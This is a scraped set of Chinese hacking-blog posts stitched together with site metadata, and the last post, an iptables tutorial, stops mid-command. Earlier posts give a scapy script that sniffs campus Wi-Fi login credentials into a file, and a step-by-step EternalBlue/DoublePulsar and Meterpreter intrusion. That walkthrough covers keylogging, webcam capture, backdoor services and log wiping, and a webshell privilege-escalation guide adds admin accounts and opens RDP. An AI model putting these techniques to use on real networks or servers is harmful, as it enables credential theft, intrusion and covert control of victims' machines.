登陆时发送的i_p_pl\ni_p_pl=JTdCJTIyZXJyb3JOdW1iZXIlMjIlM0ElMjIxJTIyJTJDJTIybmV4dFVybCUyMiUzQSUyMmh0dHAlM0ElMkYlMkYxOTIuMTY4LjE1MC4yJTNBODA4MCUyRnBvcnRhbCUyRmluZGV4X2RlZmF1bHQuanNwJTIyJTJDJTIycXVpY2tBdXRoJTIyJTNBZmFsc2UlMkMlMjJjbGllbnRMYW5ndWFnZSUyMiUzQSUyMkNoaW5lc2UlMjIlMkMlMjJhc3NpZ25JcFR5cGUlMjIlM0EwJTJDJTIyaU5vZGVQd2ROZWVkRW5jcnlwdCUyMiUzQTElMkMlMjJ3bGFubmFzaWQlMjIlM0ElMjIlMjIlMkMlMjJ3bGFuc3NpZCUyMiUzQSUyMiUyMiUyQyUyMm5hc0lwJTIyJTNBJTIyJTIyJTJDJTIyYnlvZFNlcnZlcklwJTIyJTNBJTIyMC4wLjAuMCUyMiUyQyUyMmJ5b2RTZXJ2ZXJJcHY2JTIyJTNBJTIyMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlMjIlMkMlMjJieW9kU2VydmVySHR0cFBvcnQlMjIlM0ElMjI4MDgwJTIyJTJDJTIyaWZUcnlVc2VQb3B1cFdpbmRvdyUyMiUzQWZhbHNlJTJDJTIydWFtSW5pdEN1c3RvbSUyMiUzQSUyMjElMjIlMkMlMjJjdXN0b21DZmclMjIlM0ElMjJNUSUyMiUyQyUyMnJlZ0NvZGVUeXBlJTIyJTNBJTIyTUElMjIlN0Q\n很明显这是一个base64编码过的字符串，把这个base64解码再url解码，就得到了\n{“errorNumber”:”1”,”nextUrl”:”\rhttp://192.168.xxx.x:xxxx/portal/index_default.jsp**“,”quickAuth”:false,”clientLanguage”:”Chinese”,”assignIpType”:0,”iNodePwdNeedEncrypt”:1,”wlannasid”:””,”wlanssid”:””,”nasIp”:””,”byodServerIp”:”0.0.0.0”,”byodServerIpv6”:”0000:0000:0000:0000:0000:0000:0000:0000”,”byodServerHttpPort”:”8080”,”ifTryUsePopupWindow”:false,”uamInitCustom”:”1”,”customCfg”:”MQ”,”regCodeType”:”MA”}\n这只是向无线路由器发送的表明自己身份的未完成的表单，没有我们要的用户名和密码。\n完整认证过程 只有GET请求果然很扯，这很有可能是我们的浏览器网络流分析工具有些问题，或者该Web认证的安全性足够好，导致我们无法截取完整的请求流。\n这样就只有用Wireshark来对网卡进行完全的监听，以抓取全部流量包。\n设置Capture interface为 WLAN 无线网卡，开启抓取后重现登陆过程。\n抓到的流量包除了访问该认证网站的http流，还包括了所有经过该无线网卡的所有协议的网络流。\n设置过滤规则为http协议并且只有该认证网址ip。\n发现登录一次h3c系统，要先后传参给3个页面，一个/pws？t=li，一个/afterlogin.jsp,一个/loginSucc.jsp，所以就分别看这几个网页的抓包数据。\n发现其cookie都是一样的，但是只有pws这个页面是POST请求。\n查看pws应用层传输的数据，发现上传了【userName】和【userPwd】参数，也就是说，只有这个页面是验证密码的。\n【userName】就是登陆的用户名，【userPwd】是经过base64编码后的密码。\n总结思路 我们可以抓取用户登陆时的POST请求来获取用户名和密码，也可以在用户勾选【记住密码】时获取带有用户名密码信息的cookie。\n 当抓到client ==\u0026gt; server的数据包时   如果是GET请求，检查有没有Cookie存在。 如果是POST请求，把用户名和密码拿出来。 检查是否有set-cookie头部，有的话取出来。  最后如果有cookie被嗅探到，就带着cookie把向server索要一下密码。\n但是为了偷懒，这里就不嗅探cookie了，直接嗅探POST的用户名和密码就行了。最终思路如下：\n当抓到client ==\u0026gt; server的数据包时，如果是POST请求，直接把用户名和密码拿出来。\n嗅探 实验环境\n Ubuntu虚拟机 大功率USB无线网卡（8187等） python2.7  python扩展库需要\n requests scapy scapy_http lxml  ** 代码\nimport requests\rimport scapy_http.http as http\rfrom scapy.all import *\rfrom lxml import etree\riface = \u0026#39;wlan0\u0026#39;\rurl = \u0026#34;http://192.168.xxx.x:xxxx/portal/pws?t=li\u0026#34;\rpath = \u0026#34;/root\u0026#34;\rdef prn(pkt):\rdata = None\r#std ==\u0026gt; ap  if pkt.haslayer(http.HTTPRequest):\r#if post the username and password\r if pkt.Method == \u0026#39;POST\u0026#39; and \u0026#39;userName\u0026#39; in pkt.load: dt = {i.split(\u0026#34;=\u0026#34;)[0]:i.split(\u0026#34;=\u0026#34;)[1] for i in pkt.load.split(\u0026#34;\u0026amp;\u0026#34;)} data = \u0026#34;:::\u0026#34;.join((dt[\u0026#34;userName\u0026#34;],dt[\u0026#34;userPwd\u0026#34;][3:].decode(\u0026#34;base64\u0026#34;))) + \u0026#39;\\n\u0026#39; print \u0026#39;[+]Get! Post data:%s%s%s%s\u0026#39;%(dt[\u0026#39;userName\u0026#39;],dt[\u0026#39;userPwd\u0026#39;]) if data != None:\rwith open(path + \u0026#34;schoolUserPwd.txt\u0026#34;, \u0026#34;a\u0026#34;) as txt: txt.write(data)\rdef main(): try: sniff(iface=iface, prn=prn, filter=\u0026#34;ip host 192.168.xxx.x\u0026#34;, store=0) #sniff(offline=path + \u0026#34;school.pcap\u0026#34;, prn=prn, filter=\u0026#34;ip host 192.168.xxx.x\u0026#34;)  except KeyboardInterrupt, e: print \u0026#34;quitting...\u0026#34;\rif __name__ == \u0026#39;__main__\u0026#39;: main()\r说明\n requests用来向服务器请求 scapy用来在无线网络中嗅探 scapy_http用来对http协议更方便的解析 lxml用来从服务器返回的html文件中，解析出来用户名和密码 prn是sniff函数每过滤到一个符合条件的数据包时回调的函数，并将数据包本身作为参数传入 之所以选择Ubuntu而不是Windows是因为scapy_http在win下运行有些问题  注意\n由于我们既要嗅探，同时又要向服务器请求，所以airmon-ng check kill后，无线网卡开启monitor模式，再将网卡调到信号最强的ap的信道上。之前经过kismet抓取无线网包发现该校园网WIFI是在channel 1/6/11信道上工作的。\n最后再打开网络管理的服务。\n执行以下命令\n$sudo airmon-ng check kill\r$sudo ifconfig wlan0 down\r$sudo iwconfig wlan0 mode monitor\r$sudo ifconfig wlan0 up\r$sudo iwconfig mon0 channel 1/6/11\r$sudo service network-manager start\r结果\n由于之前买的无线网卡是劣质品无法识别，因此暂无结果。\n理论上是可以嗅探到的，等成功嗅探后再补发。\n参考 参考Freebuf的\r如何在开放无线网络中嗅探校园网密码**这篇文章提供的python脚本，针对该校的网络进行了一些修改。\n","date":1494288000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1494288000,"objectID":"fb2e932d3e0954cb21fb0c2beff7a26a","permalink":"https://p0st3r.github.io/post/h3c-wifi-sniff/","publishdate":"2017-05-09T00:00:00Z","relpermalink":"/post/h3c-wifi-sniff/","section":"post","summary":"某高校校区的校园网WIFI的采用H3C的Web认证，在网页里输入学号和密码，post出去，你的这个mac地址就可以上网了。此方式不是wpa/wpa2，也不是802.1x，而只是单纯的web认证，是大有文章可做的。因此我想是否能在开放无线网环境中抓取到登陆时认证发送的数据包，从中取出用户名和密码。","tags":["wifi"],"title":"H3C校园网WIFI密码嗅探","type":"post"},{"authors":[""],"categories":["Hack"],"content":"Shadowbroker 下载地址\nhttps://yadi.sk/d/NJqzpqo_3GxZA4\n解压密码：Reeeeeeeeeeeeeee\ngithub下载地址：\rhttps://github.com/misterch0c/shadowbroker\n释放的工具总共包含三个文件夹，\n Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。 OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional） Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。  主要工具 FUZZBUNCH：一款类似Metasploit的Exploit框架    模块 漏洞 影响系统 默认端口     Easypi IBM Lotus Notes漏洞 Windows NT, 2000 ,XP, 2003 3264   Easybee MDaemon WorldClient电子邮件服务器漏洞 WorldClient 9.5, 9.6, 10.0, 10.1 /   Eternalblue SMBv2漏洞(MS17-010) Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64) 139/445   Doublepulsar SMB和NBT漏洞 Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2 139/445   Eternalromance SMBv1漏洞(MS17-010)和 NBT漏洞 Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2 139/445   Eternalchampion SMB和NBT漏洞 Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0 139/445   Eternalsynergy SMB和NBT漏洞 Windows 8, Windows Server 2012 139/445   Explodingcan IIS6.0远程利用漏洞 Windows Server 2003 80   Emphasismine IMAP漏洞 IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5 143   Ewokfrenzy IMAP漏洞 IBM Lotus Domino 6.5.4, 7.0.2 143   Englishmansdentist SMTP漏洞 / 25   Erraticgopher RPC漏洞 Windows XP SP3, Windows 2003 445   Eskimoroll kerberos漏洞 Windows 2000, 2003, 2003 R2, 2008, 2008 R2 88   Eclipsedwing MS08-067漏洞 Windows 2000, XP, 2003 139/445   Educatedscholar MS09-050漏洞 Windows vista, 2008 445   Emeraldthread SMB和NBT漏洞 Windows XP, 2003 139/445   Zippybeer SMTP漏洞 / 445   Esteemaudit RDP漏洞 Windows XP, Windows Server 2003 3389    ETERNALBLUE攻击原理分析 ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。\n 漏洞发生处：C:\\Windows\\System32\\drivers\\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。 漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2) 触发点：_memmove(v5, (const void )(a2 + 5 + (_BYTE )(a1 + 5)), (_WORD *)(a1 + 6)); 原因：逻辑不正确导致的越界写入  官方补丁修复前：\nint __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)\r{\r//SNIP...\rwhile (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 \u0026amp;gt; v4))\r{\r*(WORD*)v6 = v3 - (_DWORD)v6; //\u0026lt;----------修改处\rreturn v1;\r}\r//SNIP...\r}\rint __thiscall ExecuteTransaction(int this)\r{\r//SNIP...\rif (*(_DWORD *)(v3 + 0x50) \u0026amp;gt;= 1) //\u0026lt;------修改处\r{\r_SrvSetSmbError2(0, 464, \u0026amp;quot;onecore\\\\base\\\\fs\\\\remotefs\\\\smb\\\\srv\\\\srv.downlevel\\\\smbtrans.c\u0026amp;quot;);\rSrvLogInvalidSmbDirect(v1, v10);\rgoto LABEL_109;\r}\r//SNIP...\r}\r修复后：\nint __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)\r{\r//SNIP...\rwhile (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 \u0026amp;gt; v4))\r{\r*(DWORD*)v6 = v3 - (_DWORD)v6; //\u0026lt;--------修改处\rreturn v1;\r}\r//SNIP...\r}\rint __thiscall ExecuteTransaction(int this)\r{\r//SNIP...\rif (*(_DWORD *)(v3 + 0x50) \u0026amp;gt;= 2u) //\u0026lt;------修改处\r{\r_SrvSetSmbError2(0, 464, \u0026amp;quot;onecore\\\\base\\\\fs\\\\remotefs\\\\smb\\\\srv\\\\srv.downlevel\\\\smbtrans.c\u0026amp;quot;);\rSrvLogInvalidSmbDirect(v1, v10);\rgoto LABEL_109;\r}\r//SNIP...\r}\r具体见参考资料5\n漏洞复现   环境搭建\n| 主机类型 | OS | IP | | :–: | :————: | :———-: | | 攻击机1 | win2003 | 10.10.10.130 | | 攻击机2 | kali linux 2.0 | 10.10.10.128 | | 靶机 | winXP x86 | 10.10.10.129 |\n  工具准备\n    解压NSA工具包中的windows文件夹到攻击机1的C:\\目录下（只要不是中文目录皆可）;\n  在攻击机1安装:\n  \rpython-2.6.6.msi**\n  \rpywin32-221.win32-py2.6.exe**\n  在攻击机2先生成用于回连的dll\nmsfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll \u0026gt; x86bind.dll\r3.扫描开启445端口的活跃主机并探测操作系统\nnmap -Pn -p445 -O 10.10.10.0/24\rnmap -Pn -p445 -O -iL ip.txt\r4.攻击机1开始利用ETERNALBLUE攻击\npython fb.py use Eternalblue ...\r5.利用Doublepulsar注入dll\nuse Doublepulsar\r6.kali攻击机利用msf回连控制主机5555端口\nuse exploit/multi/handler\rset payload windows/meterpreter/bind_tcp\rset LPORT 5555\rset RHOST XXX.XXX.XXX.XXX\rexploit\r  后渗透攻击   开3389端口\n  wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1\r  wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1\r  reg add “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\r    针对win XP及win2003只需要第3条命令 针对win 7需要第1，2条命令 针对win 2012需要3条命令\n  添加账户进管理组\nnet user [username] [password] /add\rnet localgroup Administrators [username] /add\r  端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接\nportfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX\rrdesktop -u root -p toor 127.0.0.1:4444\r  meterpreter自带的多功能shell\n hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文 screenshot:获取屏幕截图 webcam_snap:调取对方摄像头拍照 keyscan_start,keyscan_dump:记录键盘动作 ps:查看当前运行进程 sysinfo:查看系统信息 getsystem:提权    维持控制\n  migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用\n  irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态\nirb client.core.use(\u0026quot;railgun) client.railgun.kernel32.SetThreadExecutionState(\u0026quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED\u0026quot;)\r  background:隐藏在后台方便msf终端进行其他操作，session查看对话id\n  session -i X:使用已经成功获取的对话\n    植入后门\n  测试是否虚拟机：\nrun post/windows/gather/checkvm\r  以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载\nmetsrv.dll\rrun metsvc\r  getgui开启远程桌面：\nrun getgui -u sherlly -p sherlly\rrun multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号\r    清除入侵痕迹\n   clearev:清除日志 timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc  检测\u0026amp;防御   国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址\ncountercept/doublepulsar-detection-script**\n，使用方法\npython detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX\rpython detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1\r另外，nmap也基于该脚本出了对应扫描脚本\nsmb-double-pulsar-backdoor.nse**\n，使用方法\nnmap -p 445 \u0026lt;target\u0026gt; --script=smb-double-pulsar-backdoor\r  安装相应补丁\rProtecting customers and evaluating risk**\n  如非必要，关闭25, 88, 139, 445, 3389端口\n  使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)\n  参考  \rLatest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network \rShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客** \rLeaked NSA hacking tools are a hit on the dark web - CyberScoop \rsrv.sys Windows process - What is it? \rNSA Eternalblue SMB 漏洞分析 \rsmb-double-pulsar-backdoor NSE Script \r如何设置Windows 7 防火墙端口规则  ","date":1493337600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1493337600,"objectID":"b8dc3e2e1cd941c9c6102223d85c29a4","permalink":"https://p0st3r.github.io/post/nsa-tools/","publishdate":"2017-04-28T00:00:00Z","relpermalink":"/post/nsa-tools/","section":"post","summary":"前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。","tags":["CVE"],"title":"NSA方程式工具利用与分析","type":"post"},{"authors":[""],"categories":["Hack"],"content":"系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。\n比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。\n有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。\n一般的网站都存储在服务器权限比较低的文件夹里， 所以即使我们上传了WebShell，最多也只能够对网站所在的文件夹操作，而不能完整的控制整个服务器。所以我们需要进行提权，以一个权限相当高的用户来访问该服务器。\nWindows中以用户组来分配权限，每个用户组有不同的权限，其中最高权限用户组是Administrators组，拥有对整个系统进行操作system权限。每个用户组下可以创建多个用户。\n在Win10以前的Windows系统版本中，可以通过 右键此电脑=》管理=》系统工具=》本地用户和组来查看用户组及用户组中的用户。\n0x01 大马和菜刀 我试过各种大马，功能其实都大同小异，不过不知道是不是我使用的原因，里面的cmd并不怎么好用。大马里我个人觉得最有用的就是查看文件权限属性的功能，这个使我们在找后门上传点的时候是非常好用的，并且这个功能在菜刀里是没有的。\n这种php大马可以在Perms项下看到文件的读写权限属性。\n而菜刀比较好的的就是比较适合人类查看的文件目录界面，和虚拟终端。所以通常将两者结合起来用。右键任意可执行文件打开虚拟终端。\n0x02 巴西烤肉提权 创建系统用户的命令如下：\n 新建一个用户  net user [username] [password] /add\r 添加到Administrators用户组  net localgroup Administrators [username] /add\r 激活用户  net user [username] /active:yes\r由于一般网站被放在服务器中权限比较低的文件夹中，因此直接创建Administrator用户的命令是不被执行的。\n巴西烤肉是一个非常强劲的程序，它可以无视拒绝强制执行cmd命令，经常被用到提权中。\n我们通过菜刀将cmd.exe和巴西烤肉上传到网站文件夹中。\n然后右键cmd.exe打开虚拟终端，先将终端路径设置为我们自己上传的cmd.exe，再尝试直接创建用户，报错命令被拒绝执行。（其实这里是一个Ubuntu Linux服务器）\n======================================================================\n由于后来没找到Windows服务器的网站模板，因此下面就不带图了，过程全部手打还原，谅解\n======================================================================\n先将终端路径设置为我们自己上传的cmd.exe\nSETP ../../www/uploads/cmd.exe\r再用巴西烤肉强制执行命令。巴西烤肉语法：Churrasco.exe \u0026ldquo;your command\u0026rdquo;\nChu.exe \u0026#34;net user [username] [password] /add \u0026amp; net localgroup Administrators [username] /add\u0026#34;\r若无报错，那么我们就已经成为系统管理员账户了。查看当前用户会发现我们创建的用户：\nnet user\r至此，我们已经创建了超级权限的用户，已经可以对整个服务器进行操作了。但是在终端里操作总有些不方便，下面我们介绍一下拿下权限后如何远程连接进行桌面操作。\n0x03 3389端口服务 远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的Windows都有客户端所需软件。服务端电脑方面，默认听取送到TCP3389端口的数据。【百度百科】\n这是一种非常方便的对服务器的操作方式，一般的网站管理员都会开启3389端口远程桌面服务。而有的安全素养比较高的管理员则会选择将3389端口关闭，甚至开启防火墙禁止任何开启3389的操作。\n闲扯一下，最近Shadow Broker泄露的NSA的工具，内网里开3389的服务器一打一个准，有空的可以去玩玩。misterch0c/shadowbroker\n在无防火墙的情况下，我们可以用cmd命令来添加注册表开启3389端口，或者使用别人留下的工具。\n cmd命令  将以下命令写入一个.bat文件，将其拖入服务器可读写目录执行，即可开启3389端口。\n此种对Windows XP 和2003系统有用，不用重起\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r  写好的程序\nChu.exe \u0026#34;kai3389.exe\u0026#34;\r就行了\n  在有防火墙的情况下，需将防火墙先关闭，再用lcx.exe将3389映射到其他端口上，这个等我搞懂了再写。\n0x04 RDP远程桌面连接 创建好用户，开启远程桌面功能，就可以用此用户远程登陆别人的服务器直接进行桌面操作，岂不是美滋滋。\nWin+R 打开【运行】窗口，运行\nmstsc /admin\r用直接创建的用户名和密码登录，OK。\n","date":1492646400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1492646400,"objectID":"d1d75de2789f46f35cd2abd9dbb4288f","permalink":"https://p0st3r.github.io/post/win-getshell-and-open-rdp/","publishdate":"2017-04-20T00:00:00Z","relpermalink":"/post/win-getshell-and-open-rdp/","section":"post","summary":"系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器","tags":["windows","3389","rdp","提权"],"title":"Windows服务器提权和开启3389远程连接","type":"post"},{"authors":[""],"categories":["Hack"],"content":"0x00 iptables简介 netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案。\nLinux防火墙体系主要工作在网络层，针对TCP/IP数据包实施过滤和限制，完成封包过滤、封包重定向和网络地址转换（NAT）等功能，属于典型的包过滤防火墙（也称网络层防火墙）。其基于内核编码实现，具有非常稳定的性能和高效率，因此被广泛的应用。\n1. Netfilter和iptables的区别：  Netfilter:指的是Linux内核中实现包过滤防火墙的内部结构，不以程序或文件的形式存在，属于“内核态”（KernelSpace，又称内核空间）的防火墙功能体系； Iptables：指的是用来管理Linux防火墙的命令程序，通常位于/sbin/iptables，属于“用户态”（UserSpace，又称用户空间）的防火墙管理体系；  所以其实iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是 netfilter，它是Linux内核中实现包过滤的内部结构。\n2. 规则（rules) 规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。\n规则存储在内核空间的信息 包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、**拒绝（reject）和丢弃（drop）**等。\n配置防火墙的主要工作就是添加、修改和删除这些规则。\n3. 包过滤的工作层次： 主要是网络层，针对IP数据包。体现在对包内的IP地址、端口等信息的处理上。\n3. iptables的表、链结构： iptables作用：为包过滤机制的实现提供规则（或策略），通过各种不同的规则，告诉netfilter对来自某些源、前往某些目的或具有某些协议特征的数据包应该如何处理。\niptables内置了4个表，即filter表、nat表、mangle表和raw表，分别用于实现包过滤，网络地址转换、包重构(修改)和数据跟踪处理。 链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一 条或数条规则。\n当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据 该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定 义的默认策略来处理数据包。\n规则链：  规则的作用：对数据包进行过滤或处理 链的作用：容纳各种防火墙规则 链的分类依据：处理数据包的不同时机  默认包括5种规则链\n INPUT：处理入站数据包 OUTPUT：处理出站数据包 FORWARD：处理转发数据包 POSTROUTING链：在进行路由选择后处理数据包（对数据链进行源地址修改转换） PREROUTING链：在进行路由选择前处理数据包（做目标地址转换）  INPUT、OUTPUT链主要用在“主机型防火墙”中，即主要针对服务器本机进行保护的防火墙；而FORWARD、PREROUTING=、POSTROUTING链多用在“网络型防火墙”中。\n规则表  表的作用：容纳各种规则链 表的划分依据：防火墙规则的作用相似  默认包括4个规则表：\n raw表：确定是否对该数据包进行状态跟踪；对应iptable_raw，表内包含两个链：OUTPUT、PREROUTING mangle表：为数据包的TOS（服务类型）、TTL（生命周期）值，或者为数据包设置Mark标记，以实现流量整形、策略路由等高级应用。其对应iptable_mangle，表内包含五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD nat表：修改数据包中的源、目标IP地址或端口；其对应的模块为iptable_nat，表内包括三个链：PREROUTING、POSTROUTING、OUTPUT filter表：确定是否放行该数据包（过滤）；其对应的内核模块为iptable_filter，表内包含三个链：INPUT、FORWARD、OUTPUT  Iptables采用“表”和“链”的分层结构。注意一定要明白这些表和链的关系及作用。\n4. 链、表的优先顺序   规则表之间的优先顺序\n   Raw==》mangle==》nat==》filter    规则链之间的顺序\n   入站：PREROUTING==》INPUT 出站：OUTPUT==》POSTROUTING 转发：PREROUTING==》FORWARD==》POSTROUTIN    规则链内的匹配顺序\n   按顺序依次检查，匹配即停止（LOG策略例外） 若找不到相匹配的规则，则按该链的默认策略处理    0x01 编写防火墙规则 1. iptables 的基本语法、控制类型 iptables [ -t 表名] 选项 [链名] [条件] [ -j 控制类型] 注意事项：\n 不指定表名时，-t 默认指filter表 不指定链名时，默认指表内的所有链 除非设置链的默认策略，否则必须指定匹配条件 选项、链名、控制类型使用大写字母，其余均为小写  2. 数据包的常见控制类型   ACCEPT：允许通过 DROP：直接丢弃，不给出任何回应 REJECT：拒绝通过，必要时会给出提示 LOG：在/var/log/messages文件中记录日志信息，然后传给下一条规则继续匹配（匹配即停止对LOG操作不起作用，因为LOG只是一种辅助动作，并没有真正的处理数据包）   3. iptables命令的管理控制选项  -A 在指定链的末尾添加（append）一条新的规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加-R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） -N 新建（new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（delete-chain） -P 设置指定链的默认策略（policy） -Z 将所有表的所有链的字节和数据包计数器清零 -n 使用数字形式（numeric）显示输出结果 -v：以更详细的方式显示规则信息 \u0026ndash;line-numbers：查看规则时，显示规则的序号-X：删除自定义的规则链 eg：将filter表中FORWARD链中的默认策略设为丢弃，OUTPUT链的默认策略设为允许  4. 规则的匹配条件   通用匹配\n    协议匹配: -p [协议名]\n  地址匹配\n   -s [源地址] -d [目标地址]    接口匹配\n   -i [入站网卡] -o [出站网卡]      隐含匹配\n    端口匹配\n   -sport [源端口] -dport [目标端口]    TCP标记匹配：\u0026ndash;tcp-flags [检查范围] [被设置的标记]\n  ICMP类型匹配：\u0026ndash;icmp-type [ICMP类型]\n    显式匹配\n   多端口匹配：-m multiport \u0026ndash;sport | \u0026ndash;dport [端口列表] IP范围匹配：-m iprange \u0026ndash;src-range [IP范围] MAC地址匹配：-m mac \u0026ndash;mac-range [MAC地址] 状态匹配：-m state \u0026ndash;state [连接状态]    常见通用匹配条件：  协议匹配：-p [协议名]  （eg：tcp、udp、icmp、all(针对所有IP数据包)），可用的协议类型存放于Linux系统的/etc/procotols文件中；\neg：丢弃通过icmp协议访问防火墙本机的数据包、允许转发经过防火墙的除icmp协议以外的数据包：\n[root@iptables ~]# iptables -I INPUT -p icmp -j DROP\r[root@iptables ~]# iptables -A FORWARD -p ! icmp -j ACCEPT\r【！】表示取反\n2. 地址匹配：-s [源地址]、 -d [目标地址]\n可以是IP地址、网段地址，但不建议使用主机名、域名地址，因为解析过程会影响效率\neg：拒绝转发源地址为192.168.10.100的数据、允许转发源地址位于192.168.1.0/24网段的数据：\n[root@iptables ~]# iptables -A FORWARD -s 192.168.10.100 -j REJECT [root@iptables ~]# iptables -A FORWARD -s 192.168.1.0/24 -j ACCEPT 当遇到小规模的网络扫描或攻击时，封IP地址是比较有效的方式。\neg：添加防火墙规则封锁来自172.16.16.0/24网段的频繁扫描、登录穷举等不良企图：\n[root@iptables ~]# iptables -I INPUT -s 172.16.16.0/24 -j DROP [root@iptables ~]# iptables -I FORWARD -s 172.16.16.0/24 -j DROP\r3. 接口匹配：-i [入站网卡]、-o [出站网卡]\neg：丢弃从外网接口eth0访问防火墙本机且源地址为私有地址的数据包：\n[root@iptables ~]# iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP\r常用隐含匹配条件： 1. 端口匹配：\u0026ndash;sport [源端口]、\u0026ndash;dport [目的端口]\n单个端口号或者以冒号“：”分隔的端口范围都是可以接受的，但不连续的多个端口不能采用这种方式。\neg：允许为网段192.168.1.0/24转发DNS查询数据包：\n[root@iptables ~]# iptables -A FORWARD -s 192.168.1.0/24 -p udp --dport 53 -j ACCEPT [root@iptables ~]# iptables -A FORWARD -d 192.168.1.0/24 -p udp --sport 53 -j ACCEPT\neg：构建vsftpd服务器时，开放20、21端口，以及用于被动模式的端口范围24500~24600：\n[root@iptables ~]# iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p tcp --dport 24500:24600 -j ACCEPT\n2. TCP标记匹配：\u0026ndash;tcp-flags 检查范围 被设置的标记\n针对协议为TCP、用来检查数据包的标记位（\u0026ndash;tcp-flags）\n“检查范围”指出需要检查数据包的哪几个标记，“被设置的标记”则明确匹配对应值为1的标记，多个标记之间以逗号进行分隔。\neg：拒绝从外网接口eth0直接访问防火墙本机的TCP请求，但允许其他主机发给防火墙的TCP等响应数据包请求：\n[root@iptables ~]# iptables -P INPUT DROP [root@iptables ~]# iptables -I INPUT -i eth0 -p tcp --tcp-flags SYN,RST,ACK SYN -j 